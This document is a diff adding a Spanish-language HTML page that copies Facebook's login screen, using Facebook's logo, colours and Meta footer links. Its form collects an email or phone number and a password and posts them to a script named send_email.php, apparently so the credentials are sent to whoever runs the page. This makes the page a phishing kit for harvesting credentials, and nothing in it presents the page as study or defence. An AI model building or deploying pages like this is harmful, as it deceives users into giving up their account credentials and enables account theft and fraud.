@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión en Facebook</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Helvetica:wght@400;700&display=swap');
+
+        body {
+            font-family: 'Helvetica', Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .logo img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 360px;
+        }
+
+        .login-container h2 {
+            color: #1877f2;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 20px;
+        }
+
+        .login-container .input-group {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 10px;
+        }
+
+        .login-container .input-group input {
+            padding: 14px;
+            border-radius: 6px;
+            border: 1px solid #dddfe2;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        .login-container input[type="submit"] {
+            width: 100%;
+            padding: 14px;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+
+        .login-container a {
+            display: block;
+            margin: 10px 0;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .login-container .divider {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        .login-container .divider hr {
+            width: 45%;
+            border: none;
+            border-top: 1px solid #dddfe2;
+        }
+
+        .login-container .divider span {
+            margin: 0 10px;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .login-container .create-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #777;
+            font-size: 12px;
+            line-height: 1.5;
+        }
+
+        .footer .languages,
+        .footer .links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin-bottom: 10px;
+        }
+
+        .footer .languages a,
+        .footer .links a {
+            color: #777;
+            text-decoration: none;
+            margin: 4px 8px;
+            font-size: 12px;
+        }
+
+        .footer .meta {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">
+        <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook Logo">
+    </div>
+    <div class="login-container">
+        <h2>Iniciar sesión en Facebook</h2>
+        <form action="send_email.php" method="post">
+            <div class="input-group">
+                <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required>
+                <input type="password" name="password" placeholder="Contraseña" required>
+            </div>
+            <input type="submit" value="Iniciar sesión">
+            <a href="#">¿Olvidaste tu cuenta?</a>
+            <div class="divider">
+                <hr>
+                <span>o</span>
+                <hr>
+            </div>
+            <button type="button" class="create-btn">Crear cuenta nueva</button>
+        </form>
+    </div>
+    <div class="footer">
+        <div class="languages">
+            <a href="#">Español</a>
+            <a href="#">English (US)</a>
+            <a href="#">Italiano</a>
+            <a href="#">Português (Brasil)</a>
+            <a href="#">Français (France)</a>
+            <a href="#">Deutsch</a>
+            <a href="#">日本語</a>
+            <a href="#">中文(简体)</a>
+            <a href="#">العربية</a>
+            <a href="#">हिन्दी</a>
+            <a href="#">+</a>
+        </div>
+        <div class="links">
+            <a href="#">Registrarte</a>
+            <a href="#">Iniciar sesión</a>
+            <a href="#">Messenger</a>
+            <a href="#">Facebook Lite</a>
+            <a href="#">Video</a>
+            <a href="#">Lugares</a>
+            <a href="#">Juegos</a>
+            <a href="#">Marketplace</a>
+            <a href="#">Meta Pay</a>
+            <a href="#">Meta Store</a>
+            <a href="#">Meta Quest</a>
+            <a href="#">Meta Ray-Ban</a>
+            <a href="#">Meta AI</a>
+            <a href="#">Instagram</a>
+            <a href="#">Threads</a>
+            <a href="#">Recaudaciones de fondos</a>
+            <a href="#">Servicios</a>
+            <a href="#">Centro de información de votación</a>
+            <a href="#">Política de privacidad</a>
+            <a href="#">Centro de privacidad</a>
+            <a href="#">Configuración de cookies</a>
+            <a href="#">Grupos</a>
+            <a href="#">Información</a>
+            <a href="#">Crear anuncio</a>
+            <a href="#">Crear página</a>
+            <a href="#">Desarrolladores</a>
+            <a href="#">Empleo</a>
+            <a href="#">Cookies</a>
+            <a href="#">Opciones de anuncios</a>
+            <a href="#">Condiciones</a>
+            <a href="#">Ayuda</a>
+            <a href="#">Importación de contactos y no usuarios</a>
+            <a href="#">Configuración</a>
+            <a href="#">Registro de actividad</a>
+        </div>
+        <div class="meta">
+            Meta © 2024
+        </div>
+    </div>
+</body>
+</html>
+
